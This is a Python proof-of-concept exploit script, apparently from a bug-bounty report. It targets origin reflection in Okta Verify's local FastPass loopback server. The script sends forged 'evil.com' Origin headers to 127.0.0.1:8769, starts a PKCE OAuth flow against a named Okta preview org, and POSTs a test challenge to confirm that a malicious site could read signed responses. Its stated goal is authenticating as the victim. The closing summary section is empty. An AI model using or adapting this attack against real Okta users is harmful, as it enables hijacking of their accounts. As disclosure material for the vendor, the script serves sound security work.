"""
Okta FastPass CORS Reflection PoC
Simulates what a malicious website (evil.com) would do:
1. Start an Okta auth flow to get a challenge
2. Relay the challenge to the victim's local Okta Verify loopback server
3. Read the signed response (possible because CORS reflects any origin)
4. Use the signed response to complete authentication as the victim
"""
import urllib.request
import urllib.parse
import json
import hashlib
import base64
import os
import ssl

ORG = "https://bugcrowd-pam-4593.oktapreview.com"
CLIENT_ID = "0oavvphi56SbYPzXk1d7"
LOOPBACK = "http://127.0.0.1:8769"
EVIL_ORIGIN = "https://evil.com"

ctx = ssl.create_default_context()

print("=" * 60)
print("Okta FastPass CORS Reflection PoC")
print("=" * 60)

# Step 1: Probe the loopback server (simulating evil.com JavaScript)
print("\n[Step 1] Probing loopback server from 'evil.com'...")
req = urllib.request.Request(f"{LOOPBACK}/probe")
req.add_header("Origin", EVIL_ORIGIN)
try:
    resp = urllib.request.urlopen(req, timeout=3)
    print(f"  Probe: HTTP {resp.status}")
    cors = resp.getheader("Access-Control-Allow-Origin")
    print(f"  CORS Allow-Origin: {cors}")
    if cors == EVIL_ORIGIN:
        print(f"  CONFIRMED: Origin reflected back to evil.com!")
except Exception as e:
    print(f"  Probe failed: {e}")
    exit(1)

# Step 2: Start an OAuth2 authorize flow to trigger the IDX pipeline
# This is what the Sign-In Widget does
print("\n[Step 2] Starting OAuth2 authorize flow...")
code_verifier = base64.urlsafe_b64encode(os.urandom(32)).rstrip(b"=").decode()
code_challenge = base64.urlsafe_b64encode(
    hashlib.sha256(code_verifier.encode()).digest()
).rstrip(b"=").decode()

auth_url = (
    f"{ORG}/oauth2/default/v1/authorize?"
    f"client_id={CLIENT_ID}&"
    f"redirect_uri=http://localhost:8080/callback&"
    f"response_type=code&"
    f"scope=openid profile&"
    f"state=test123&"
    f"code_challenge={code_challenge}&"
    f"code_challenge_method=S256"
)
print(f"  Auth URL: {auth_url[:100]}...")

# Follow the redirect to get the IDX state
req = urllib.request.Request(auth_url)
req.add_header("Accept", "text/html")
try:
    resp = urllib.request.urlopen(req, timeout=10, context=ctx)
    body = resp.read().decode(errors="replace")
    # Look for stateToken or interactionHandle in the page
    import re
    state_match = re.search(r'"interactionHandle"\s*:\s*"([^"]+)"', body)
    if state_match:
        interaction_handle = state_match.group(1)
        print(f"  Interaction Handle: {interaction_handle[:40]}...")
    else:
        # Try stateToken
        state_match = re.search(r'"stateToken"\s*:\s*"([^"]+)"', body)
        if state_match:
            print(f"  State Token: {state_match.group(1)[:40]}...")
        else:
            # Look for any challenge or nonce
            nonce_match = re.search(r'"nonce"\s*:\s*"([^"]+)"', body)
            challenge_match = re.search(r'"challengeRequest"\s*:\s*"([^"]+)"', body)
            if challenge_match:
                print(f"  Challenge found: {challenge_match.group(1)[:60]}...")
            elif nonce_match:
                print(f"  Nonce: {nonce_match.group(1)[:40]}...")
            else:
                # Print a snippet to see what we got
                print(f"  Response length: {len(body)}")
                # Search for anything auth-related
                for pattern in [r'"okta[^"]*"', r'"challenge[^"]*"', r'"factor[^"]*"']:
                    matches = re.findall(pattern, body, re.IGNORECASE)
                    if matches:
                        print(f"  Found: {matches[:5]}")
except urllib.error.HTTPError as e:
    location = e.headers.get("Location", "")
    print(f"  HTTP {e.code} -> Location: {location[:100]}")
    if "error=" in location:
        print(f"  Error in redirect, may need app assignment or policy config")
except Exception as e:
    print(f"  Error: {e}")

# Step 3: Try to directly POST a challenge to the loopback
# Even without a real challenge JWT, we can test if the loopback server
# accepts cross-origin POST with content-type json
print("\n[Step 3] Testing cross-origin POST to /challenge endpoint...")
challenge_data = json.dumps({"challengeRequest": "test"}).encode()
req = urllib.request.Request(
    f"{LOOPBACK}/challenge",
    data=challenge_data,
    method="POST"
)
req.add_header("Origin", EVIL_ORIGIN)
req.add_header("Content-Type", "application/json")
try:
    resp = urllib.request.urlopen(req, timeout=5)
    body = resp.read().decode()
    cors = resp.getheader("Access-Control-Allow-Origin")
    print(f"  HTTP {resp.status}")
    print(f"  CORS Allow-Origin: {cors}")
    print(f"  Response: {body[:200]}")
except urllib.error.HTTPError as e:
    body = e.read().decode() if e.fp else ""
    cors = e.headers.get("Access-Control-Allow-Origin", "N/A")
    print(f"  HTTP {e.code}")
    print(f"  CORS Allow-Origin: {cors}")
    print(f"  Response: {body[:300]}")
    if cors == EVIL_ORIGIN:
        print(f"\n  CONFIRMED: Even error responses reflect the evil.com origin!")
        print(f"  A real challenge JWT would be processed and the signed response")
        print(f"  would be readable by evil.com JavaScript via CORS.")
except Exception as e:
    print(f"  Error: {e}")

print("\n" + "=" * 60)
print("Summary")
print("=" * 60)
